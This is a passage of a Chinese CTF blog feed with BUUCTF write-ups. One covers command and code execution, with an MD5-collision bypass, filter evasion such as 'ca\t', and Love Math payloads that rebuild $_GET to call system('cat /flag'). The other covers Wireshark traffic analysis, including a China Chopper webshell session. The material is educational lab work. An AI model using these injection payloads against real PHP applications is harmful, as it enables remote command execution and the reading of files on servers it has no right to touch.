background:url(.&#x2F;bj.png)  no-repeat center center;</span><br><span class="line">   background-size:cover;</span><br><span class="line">   background-attachment:fixed;</span><br><span class="line">   background-color:#CCCCCC;</span><br><span class="line">&#125;</span><br><span class="line">&lt;&#x2F;style&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">&lt;&#x2F;body&gt;</span><br><span class="line">&lt;&#x2F;html&gt;</span><br></pre></td></tr></table></figure><p>然后开始代码审计：</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">if ((string)$_POST[&#39;a&#39;] !&#x3D;&#x3D; (string)$_POST[&#39;b&#39;] &amp;&amp; md5($_POST[&#39;a&#39;]) &#x3D;&#x3D;&#x3D; md5($_POST[&#39;b&#39;])) &#123;</span><br><span class="line">     echo &#96;$cmd&#96;;</span><br><span class="line"> &#125; else &#123;</span><br><span class="line">     echo (&quot;md5 is funny ~&quot;);</span><br><span class="line"> &#125;</span><br></pre></td></tr></table></figure><p>发现这里有命令执行的地方，然后就要绕过这个md5</p><p>这里使用md5碰撞，将url编码后的md5值</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">a&#x3D;%4d%c9%68%ff%0e%e3%5c%20%95%72%d4%77%7b%72%15%87%d3%6f%a7%b2%1b%dc%56%b7%4a%3d%c0%78%3e%7b%95%18%af%bf%a2%00%a8%28%4b%f3%6e%8e%4b%55%b3%5f%42%75%93%d8%49%67%6d%a0%d1%55%5d%83%60%fb%5f%07%fe%a2&amp;b&#x3D;%4d%c9%68%ff%0e%e3%5c%20%95%72%d4%77%7b%72%15%87%d3%6f%a7%b2%1b%dc%56%b7%4a%3d%c0%78%3e%7b%95%18%af%bf%a2%02%a8%28%4b%f3%6e%8e%4b%55%b3%5f%42%75%93%d8%49%67%6d%a0%d1%d5%5d%83%60%fb%5f%07%fe%a2</span><br></pre></td></tr></table></figure><p><img src= "/img/loading.gif" data-src="https://images-1300363852.cos.ap-shanghai.myqcloud.com/CTF%5BWeb%5D/RCE/RCE%E6%80%BB%E7%BB%93image-20200714185945464.png" alt="image-20200714185945464"></p><p>然后这里吧ls这些都过滤了，就还能使用dir，然后在根目录发现了flag，这里空格用%20代替，然后cat flag，cat也被过滤了，可以用<code>ca\t</code></p><p><img src= "/img/loading.gif" data-src="https://images-1300363852.cos.ap-shanghai.myqcloud.com/CTF%5BWeb%5D/RCE/RCE%E6%80%BB%E7%BB%93image-20200714192557041.png" alt="image-20200714192557041"></p><p>flag:</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">flag&#123;0341b6e5-2749-4fee-920c-0703c27e8dc7&#125;</span><br></pre></td></tr></table></figure><hr><h2 id="代码执行"><a href="#代码执行" class="headerlink" title="代码执行"></a>代码执行</h2><h3 id="RoarCTF-2019-Easy-Calc"><a href="#RoarCTF-2019-Easy-Calc" class="headerlink" title="[RoarCTF 2019]Easy Calc"></a>[RoarCTF 2019]Easy Calc</h3><p><strong>本题要点：</strong></p><ul><li><strong>代码执行</strong></li><li><strong>绕过waf，PHP的字符串解析特性</strong></li><li><strong>关键字过滤</strong></li></ul><p><img src= "/img/loading.gif" data-src="https://images-1300363852.cos.ap-shanghai.myqcloud.com/CTF%5BWeb%5D/RCE/BUUCTF-%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C&&%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20200704100142562.png" alt="image-20200704100142562"></p><p>拿到题目首先查看源码，发现提示：</p><p><img src= "/img/loading.gif" data-src="https://images-1300363852.cos.ap-shanghai.myqcloud.com/CTF%5BWeb%5D/RCE/BUUCTF-%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C&&%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20200704100223762.png" alt="image-20200704100223762"></p><p><code>$(&#39;#calc&#39;).submit(function()</code>对<code>calc</code>表单操作</p><p>$(“#content”).val() ：</p><p>获取id为content的HTML标签元素的值,是 JQuery ,   $(“#content”)相当于document.getElementById(“content”);    $(“#content”).val()相当于 document.getElementById(“content”).value;</p><p>首先发现一个新页面：</p><p><img src= "/img/loading.gif" data-src="https://images-1300363852.cos.ap-shanghai.myqcloud.com/CTF%5BWeb%5D/RCE/BUUCTF-%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C&&%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20200704100628245.png" alt="image-20200704100628245"></p><p>尝试注入：</p><p><img src= "/img/loading.gif" data-src="https://images-1300363852.cos.ap-shanghai.myqcloud.com/CTF%5BWeb%5D/RCE/BUUCTF-%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C&&%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20200704101054473.png" alt="image-20200704101054473"></p><p>但是只要注入字母就会报错，之前的源码也提示存在waf，这里用的是一个新的点：<code>PHP的字符串解析特性</code><br>构造参数<code>? num=phpinfo()</code>（注意num前面有个空格）就能够绕过：</p><p><img src= "/img/loading.gif" data-src="https://images-1300363852.cos.ap-shanghai.myqcloud.com/CTF%5BWeb%5D/RCE/BUUCTF-%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C&&%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20200704101231082.png" alt="image-20200704101231082"></p><p>然后尝试读取目录，但是<code>/</code>被过滤了，可以使用chr(47)来绕过</p><p><img src= "/img/loading.gif" data-src="https://images-1300363852.cos.ap-shanghai.myqcloud.com/CTF%5BWeb%5D/RCE/BUUCTF-%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C&&%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20200704101732870.png" alt="image-20200704101732870"></p><p>然后读取flag</p><p><img src= "/img/loading.gif" data-src="https://images-1300363852.cos.ap-shanghai.myqcloud.com/CTF%5BWeb%5D/RCE/BUUCTF-%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C&&%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20200704101943514.png" alt="image-20200704101943514"></p><p>flag:</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">?%20num&#x3D;var_dump(file_get_contents(chr(47).chr(102).chr(49).chr(97).chr(103).chr(103)))</span><br></pre></td></tr></table></figure><h3 id="CISCN-2019-初赛-Love-Math"><a href="#CISCN-2019-初赛-Love-Math" class="headerlink" title="[CISCN 2019 初赛]Love Math]"></a>[CISCN 2019 初赛]Love Math]</h3><p><strong>本题要点：</strong></p><ul><li>可变函数</li><li>php中函数名默认为字符串</li></ul><p><strong>源码如下：</strong></p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">&#x2F;&#x2F; 关闭错误报告</span><br><span class="line">error_reporting(0);</span><br><span class="line">&#x2F;&#x2F;听说你很喜欢数学，不知道你是否爱它胜过爱flag</span><br><span class="line">if(!isset($_GET[&#39;c&#39;]))&#123;</span><br><span class="line">    show_source(__FILE__);</span><br><span class="line">&#125;else&#123;</span><br><span class="line">    &#x2F;&#x2F;例子 c&#x3D;20-1</span><br><span class="line">    $content &#x3D; $_GET[&#39;c&#39;];</span><br><span class="line">    if (strlen($content) &gt;&#x3D; 80) &#123;</span><br><span class="line">        die(&quot;太长了不会算&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">    $blacklist &#x3D; [&#39; &#39;, &#39;\t&#39;, &#39;\r&#39;, &#39;\n&#39;,&#39;\&#39;&#39;, &#39;&quot;&#39;, &#39;&#96;&#39;, &#39;\[&#39;, &#39;\]&#39;];</span><br><span class="line">    foreach ($blacklist as $blackitem) &#123;</span><br><span class="line">        if (preg_match(&#39;&#x2F;&#39; . $blackitem . &#39;&#x2F;m&#39;, $content)) &#123;</span><br><span class="line">            die(&quot;请不要输入奇奇怪怪的字符&quot;);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    &#x2F;&#x2F;常用数学函数http:&#x2F;&#x2F;www.w3school.com.cn&#x2F;php&#x2F;php_ref_math.asp</span><br><span class="line">    $whitelist &#x3D; [&#39;abs&#39;, &#39;acos&#39;, &#39;acosh&#39;, &#39;asin&#39;, &#39;asinh&#39;, &#39;atan2&#39;, &#39;atan&#39;, &#39;atanh&#39;, &#39;base_convert&#39;, &#39;bindec&#39;, &#39;ceil&#39;, &#39;cos&#39;, &#39;cosh&#39;, &#39;decbin&#39;, &#39;dechex&#39;, &#39;decoct&#39;, &#39;deg2rad&#39;, &#39;exp&#39;, &#39;expm1&#39;, &#39;floor&#39;, &#39;fmod&#39;, &#39;getrandmax&#39;, &#39;hexdec&#39;, &#39;hypot&#39;, &#39;is_finite&#39;, &#39;is_infinite&#39;, &#39;is_nan&#39;, &#39;lcg_value&#39;, &#39;log10&#39;, &#39;log1p&#39;, &#39;log&#39;, &#39;max&#39;, &#39;min&#39;, &#39;mt_getrandmax&#39;, &#39;mt_rand&#39;, &#39;mt_srand&#39;, &#39;octdec&#39;, &#39;pi&#39;, &#39;pow&#39;, &#39;rad2deg&#39;, &#39;rand&#39;, &#39;round&#39;, &#39;sin&#39;, &#39;sinh&#39;, &#39;sqrt&#39;, &#39;srand&#39;, &#39;tan&#39;, &#39;tanh&#39;];</span><br><span class="line">    preg_match_all(&#39;&#x2F;[a-zA-Z_\x7f-\xff][a-zA-Z_0-9\x7f-\xff]*&#x2F;&#39;, $content, $used_funcs);  </span><br><span class="line">    foreach ($used_funcs[0] as $func) &#123;</span><br><span class="line">        if (!in_array($func, $whitelist)) &#123;</span><br><span class="line">            die(&quot;请不要输入奇奇怪怪的函数&quot;);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    &#x2F;&#x2F;帮你算出答案</span><br><span class="line">    eval(&#39;echo &#39;.$content.&#39;;&#39;);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>*<em>PHP preg_match_all() *</em></p><p>preg_match_all 函数用于执行一个全局正则表达式匹配。</p><p>这里将匹配到的存入$used_funcs数组</p><p><strong>dechex()</strong></p><p>dechex() 函数把十进制转换为十六进制。</p><p>*<em>base_convert() *</em></p><p>函数在任意进制之间转换数字。这里将10进制转换成36进制，<code>37907361743</code>转换为<code>hex2bin</code></p><p><strong>hex2bin()</strong></p><p>函数把十六进制值的字符串转换为 ASCII 字符。</p><p><strong>dechex()</strong> </p><p>函数把十进制转换为十六进制。</p><hr><p>首先进行代码审计</p><p>绕过思路：</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">调用数学函数逐步拼凑出$_GET&#x2F;$_POST</span><br><span class="line">异或得到$__GET&#x2F;$_POST</span><br></pre></td></tr></table></figure><h4 id="方法一："><a href="#方法一：" class="headerlink" title="方法一："></a>方法一：</h4><p><strong>调用数学函数逐步拼凑出$_GET：</strong></p><p>payload1:</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#x2F;?abs&#x3D;cat &#x2F;flag&amp;pow&#x3D;system&amp;c&#x3D;$pi&#x3D;base_convert(37907361743,10,36)(dechex(1598506324));($$pi)&#123;pow&#125;($$pi&#123;abs&#125;)      &#x2F;&#x2F;system(cat &#x2F;flag)</span><br></pre></td></tr></table></figure><ul><li><p>base_convert(37907361743,10,36)      10进制转成36进制，得到hex2bin</p></li><li><p>Hex2bin 传入 dechex(1598506324)      也就是“_GET”的hex值，将其从hex转换为字符串。</p></li><li><p>$pi就是“_GET”这个字符串了。</p></li><li><p>($$pi)    会调用到$_GET</p></li><li><p>{pow}   等效于[pow]，调用$_GET[‘pow’]</p></li><li><p>后面加上括号，将前面的（$$pi）{pow}的输出结果作为函数名使用，括号里传参数，转换机制同理。</p></li><li><p>($$pi){pow}($$pi{abs})相当于：$_GET[pow]$_GET[abs]</p></li></ul><h4 id="方法二："><a href="#方法二：" class="headerlink" title="方法二："></a>方法二：</h4><p>异或得到$_GET[]或$_POST</p><p>payload2：</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">?c&#x3D;$pi&#x3D;(is_nan^(6).(4)).(tan^(1).(5));$pi&#x3D;$$pi;$pi&#123;0&#125;($pi&#123;1&#125;)&amp;0&#x3D;system&amp;1&#x3D;cat%20&#x2F;flag</span><br></pre></td></tr></table></figure><p>payload3:</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">?c&#x3D;$pi&#x3D;base_convert,$pi(696468,10,36)(($pi(8768397090111664438,10,30))()&#123;1&#125;)&#x2F;&#x2F;exec(getallheaders()&#123;1&#125;)</span><br></pre></td></tr></table></figure><h3 id="GXYCTF2019-禁止套娃"><a href="#GXYCTF2019-禁止套娃" class="headerlink" title="[GXYCTF2019]禁止套娃"></a>[GXYCTF2019]禁止套娃</h3><p><strong>本题要点：</strong></p><ul><li><strong>.git泄露</strong></li><li><strong>无参数RCE</strong></li></ul><p>打开页面发现啥也没有，于是使用<code>ctf-wscan-master</code>进行目录扫描，发现存在 <code>.git</code> 文件泄露。</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">python ctf-wscan.py http:&#x2F;&#x2F;6dffd023-f82a-4ffa-aefa-991501ac1a3d.node3.buuoj.cn&#x2F;</span><br></pre></td></tr></table></figure><p><img src= "/img/loading.gif" data-src="https://images-1300363852.cos.ap-shanghai.myqcloud.com/CTF%5BWeb%5D/RCE/RCE%E6%80%BB%E7%BB%93image-20200715144715990.png" alt="image-20200715144715990"></p><p>使用 <code>githack</code> 工具获取内部文件：</p>]]></content:encoded>
      
      <comments>http://www.yym.show/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C&amp;%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E9%A2%98%E7%9B%AE/#disqus_thread</comments>
    </item>
    
    <item>
      <title>BUUCTF-流量分析刷题记录</title>
      <link>http://www.yym.show/2020-06-30-BUUCTF-%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/</link>
      <guid>http://www.yym.show/2020-06-30-BUUCTF-%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/</guid>
      <pubDate>Tue, 30 Jun 2020 07:14:00 GMT</pubDate>
      <description>
      
        
        
          &lt;h3 id=&quot;一丶wireshark&quot;&gt;&lt;a href=&quot;#一丶wireshark&quot; class=&quot;headerlink&quot; title=&quot;一丶wireshark&quot;&gt;&lt;/a&gt;一丶wireshark&lt;/h3&gt;&lt;p&gt;&lt;img src= &quot;/img/loading.gif&quot; data-
        
      
      </description>
      
      
      <content:encoded><![CDATA[<h3 id="一丶wireshark"><a href="#一丶wireshark" class="headerlink" title="一丶wireshark"></a>一丶wireshark</h3><p><img src= "/img/loading.gif" data-src="https://images-1300363852.cos.ap-shanghai.myqcloud.com/CTF%5B%E6%9D%82%E9%A1%B9%5D/%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90/BUUCTF-%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20200630153805782.png" alt="image-20200630153805782"></p><p><strong>本题要点：</strong></p><ul><li>分组字节流搜索</li></ul><p>因为题目提示了登陆网站的密码就是flag，所以尝试直接在分组字节流中搜索<code>password</code></p><p>轻松秒杀：</p><p><img src= "/img/loading.gif" data-src="https://images-1300363852.cos.ap-shanghai.myqcloud.com/CTF%5B%E6%9D%82%E9%A1%B9%5D/%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90/BUUCTF-%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20200630154155787.png" alt="image-20200630154155787"></p><p>flag:</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">flag&#123;ffb7567a1d4f4abdffdb54e022f8facd&#125;</span><br></pre></td></tr></table></figure><h3 id="二丶被嗅探的流量"><a href="#二丶被嗅探的流量" class="headerlink" title="二丶被嗅探的流量"></a>二丶被嗅探的流量</h3><p><img src= "/img/loading.gif" data-src="https://images-1300363852.cos.ap-shanghai.myqcloud.com/CTF%5B%E6%9D%82%E9%A1%B9%5D/%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90/BUUCTF-%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20200630154406540.png" alt="image-20200630154406540"></p><p><strong>本题要点：</strong></p><ul><li>分组字节流搜索</li></ul><p>一开始以为这道题需要提取tcp传输的文件，没想到。。。</p><p>直接尝试分组字节流里搜索一下flag得到flag：</p><p><img src= "/img/loading.gif" data-src="https://images-1300363852.cos.ap-shanghai.myqcloud.com/CTF%5B%E6%9D%82%E9%A1%B9%5D/%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90/BUUCTF-%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20200630154902924.png" alt="image-20200630154902924"></p><p>flag:</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">flag&#123;da73d88936010da1eeeb36e945ec4b97&#125;</span><br></pre></td></tr></table></figure><h3 id="三丶easycap"><a href="#三丶easycap" class="headerlink" title="三丶easycap"></a>三丶easycap</h3><p><img src= "/img/loading.gif" data-src="https://images-1300363852.cos.ap-shanghai.myqcloud.com/CTF%5B%E6%9D%82%E9%A1%B9%5D/%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90/BUUCTF-%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20200630155023787.png" alt="image-20200630155023787"></p><p><strong>本题要点：</strong></p><ul><li>TCP流追踪</li></ul><p>这道题名字居然是easycap？？瞧不起谁呢？</p><p>应该是我瞧不起这道题了，一步秒杀，的确easy</p><p>打开流量包发现全是TCP协议包，本能反应追踪TCP流</p><p><img src= "/img/loading.gif" data-src="https://images-1300363852.cos.ap-shanghai.myqcloud.com/CTF%5B%E6%9D%82%E9%A1%B9%5D/%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90/BUUCTF-%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20200630155417736.png" alt="image-20200630155417736"></p><p>得到flag</p><p><img src= "/img/loading.gif" data-src="https://images-1300363852.cos.ap-shanghai.myqcloud.com/CTF%5B%E6%9D%82%E9%A1%B9%5D/%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90/BUUCTF-%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20200630155431755.png" alt="image-20200630155431755"></p><p>flag：</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">flag&#123;385b87afc8671dee07550290d16a8071&#125;</span><br></pre></td></tr></table></figure><h3 id="四丶数据包中的线索"><a href="#四丶数据包中的线索" class="headerlink" title="四丶数据包中的线索"></a>四丶数据包中的线索</h3><p><img src= "/img/loading.gif" data-src="https://images-1300363852.cos.ap-shanghai.myqcloud.com/CTF%5B%E6%9D%82%E9%A1%B9%5D/%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90/BUUCTF-%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20200630163445917.png" alt="image-20200630163445917"></p><p><strong>本题要点：</strong></p><ul><li>导出HTTP对象</li><li>base64解密</li></ul><p>这道题有一点小坑，我导出数据之后再base64解密后图片无法显示，也不知道哪里搞错了，不过后来直接在wireshark里解密转图片了</p><p>大致思路就是看到全是tcp流量，然后观察一下发现有数据传输，然后显示分组字节流</p><p><img src= "/img/loading.gif" data-src="https://images-1300363852.cos.ap-shanghai.myqcloud.com/CTF%5B%E6%9D%82%E9%A1%B9%5D/%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90/BUUCTF-%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20200630185219536.png" alt="image-20200630185219536"></p><p><img src= "/img/loading.gif" data-src="https://images-1300363852.cos.ap-shanghai.myqcloud.com/CTF%5B%E6%9D%82%E9%A1%B9%5D/%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90/BUUCTF-%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20200630185238871.png" alt="image-20200630185238871"></p><p>然后观察数据猜测是base64编码，然后观察解码后的数据，文件头是jpg，然后转成图片得到flag</p><p><img src= "/img/loading.gif" data-src="https://images-1300363852.cos.ap-shanghai.myqcloud.com/CTF%5B%E6%9D%82%E9%A1%B9%5D/%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90/BUUCTF-%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20200630185339209.png" alt="image-20200630185339209"></p><p>flag：</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">flag&#123;209acebf6324a09671abc31c869de72c&#125;</span><br></pre></td></tr></table></figure><h3 id="五丶被劫持的神秘礼物"><a href="#五丶被劫持的神秘礼物" class="headerlink" title="五丶被劫持的神秘礼物"></a>五丶被劫持的神秘礼物</h3><p><img src= "/img/loading.gif" data-src="https://images-1300363852.cos.ap-shanghai.myqcloud.com/CTF%5B%E6%9D%82%E9%A1%B9%5D/%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90/BUUCTF-%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20200630190024819.png" alt="image-20200630190024819"></p><p><strong>本题要点：</strong></p><ul><li>分组字节流搜索</li><li>md5加密</li></ul><p>说明越详细，题目越简单，分组字节流搜索<code>password</code>轻松秒杀、</p><p><img src= "/img/loading.gif" data-src="https://images-1300363852.cos.ap-shanghai.myqcloud.com/CTF%5B%E6%9D%82%E9%A1%B9%5D/%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90/BUUCTF-%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20200630190231735.png" alt="image-20200630190231735"></p><p>md5加密得：</p><p><img src= "/img/loading.gif" data-src="https://images-1300363852.cos.ap-shanghai.myqcloud.com/CTF%5B%E6%9D%82%E9%A1%B9%5D/%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90/BUUCTF-%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20200630190249805.png" alt="image-20200630190249805"></p><p>flag：</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">flag&#123;1d240aafe21a86afc11f38a45b541a49&#125;</span><br></pre></td></tr></table></figure><h3 id="六丶菜刀666"><a href="#六丶菜刀666" class="headerlink" title="六丶菜刀666"></a>六丶菜刀666</h3><p><img src= "/img/loading.gif" data-src="https://images-1300363852.cos.ap-shanghai.myqcloud.com/CTF%5B%E6%9D%82%E9%A1%B9%5D/%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90/BUUCTF-%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20200630193551248.png" alt="image-20200630193551248"></p><p><strong>本题要点：</strong></p><ul><li>追踪TCP流</li></ul><p>看了很多人的WP，虽然说出了解题步骤，但思路啥的都没有说清楚，然后只能自己好好研究一下思路</p><p>打开首先发现有很多TCP包和HTTP包，首先要明白他在传输什么，所以需要先追踪一下HTTP流：</p><p><img src= "/img/loading.gif" data-src="https://images-1300363852.cos.ap-shanghai.myqcloud.com/CTF%5B%E6%9D%82%E9%A1%B9%5D/%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90/BUUCTF-%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20200701140956772.png" alt="image-20200701140956772"></p><p>从<code>post</code>的内容看出就是一个菜刀连接服务器的流量，应该是执行了一个列出目录的命令，然后就看到了列出的目录里有<code>flag.txt</code>，然后猜测后面应该会有查看<code>flag.txt</code>文件的操作，但是很遗憾，查看完第一个http流还是没有有效的信息，然后只能接着查看下一个<code>HTTP</code>流，然后第二个<code>HTTP</code>流也没有什么重要的信息，第三个流有数据，但是应该是传输了一个无关紧要的<code>.deb</code>的软件包。</p><p><img src= "/img/loading.gif" data-src="https://images-1300363852.cos.ap-shanghai.myqcloud.com/CTF%5B%E6%9D%82%E9%A1%B9%5D/%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90/BUUCTF-%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20200701163947030.png" alt="image-20200701163947030"></p><p>然后继续往下看，第7个HTTP流：</p><p><img src= "/img/loading.gif" data-src="https://images-1300363852.cos.ap-shanghai.myqcloud.com/CTF%5B%E6%9D%82%E9%A1%B9%5D/%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90/BUUCTF-%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20200701181726275.png" alt="image-20200701181726275"></p><p>发现传输了一大串16进制数据，然后提取出来粘贴到<code>winhex</code>就发现了，这个文件头不就是JPG图片吗，然后保存得到了一串密码：</p><p><img src= "/img/loading.gif" data-src="https://images-1300363852.cos.ap-shanghai.myqcloud.com/CTF%5B%E6%9D%82%E9%A1%B9%5D/%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90/BUUCTF-%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20200701181848815.png" alt="image-20200701181848815"></p><p><img src= "/img/loading.gif" data-src="https://images-1300363852.cos.ap-shanghai.myqcloud.com/CTF%5B%E6%9D%82%E9%A1%B9%5D/%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90/BUUCTF-%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20200701181946127.png" alt="image-20200701181946127"></p><p>然后继续查看HTTP流，第9个HTTP流又发现了不同：</p><p><img src= "/img/loading.gif" data-src="https://images-1300363852.cos.ap-shanghai.myqcloud.com/CTF%5B%E6%9D%82%E9%A1%B9%5D/%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90/BUUCTF-%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20200701182129889.png" alt="image-20200701182129889"></p><p>杂项做得多了就一眼看出这是个zip压缩包的数据，然后这里直接复制粘贴到winhex会有问题，下面是<strong>文件提取</strong>，有两种方案：</p><p><img src= "/img/loading.gif" data-src="https://images-1300363852.cos.ap-shanghai.myqcloud.com/CTF%5B%E6%9D%82%E9%A1%B9%5D/%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90/BUUCTF-%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20200701184148144.png" alt="image-20200701184148144"></p><p><img src= "/img/loading.gif" data-src="https://images-1300363852.cos.ap-shanghai.myqcloud.com/CTF%5B%E6%9D%82%E9%A1%B9%5D/%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90/BUUCTF-%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/15171357208475.png!small" alt="Clipboard Image.png"></p><p>然后打开需要密码，尝试用之前得到的图片中的密码解密得到flag</p><p><img src= "/img/loading.gif" data-src="https://images-1300363852.cos.ap-shanghai.myqcloud.com/CTF%5B%E6%9D%82%E9%A1%B9%5D/%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90/BUUCTF-%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20200701184504989.png" alt="image-20200701184504989"></p><p>flag：</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">flag&#123;3OpWdJ-JP6FzK-koCMAK-VkfWBq-75Un2z&#125;</span><br></pre></td></tr></table></figure><h3 id="七丶被偷走的文件"><a href="#七丶被偷走的文件" class="headerlink" title="七丶被偷走的文件"></a>七丶被偷走的文件</h3><p><img src= "/img/loading.gif" data-src="https://images-1300363852.cos.ap-shanghai.myqcloud.com/CTF%5B%E6%9D%82%E9%A1%B9%5D/%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90/BUUCTF-%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20200701185150836.png" alt="image-20200701185150836"></p><h3 id="八丶秘密文件"><a href="#八丶秘密文件" class="headerlink" title="八丶秘密文件"></a>八丶秘密文件</h3><h3 id="九丶sqltest"><a href="#九丶sqltest" class="headerlink" 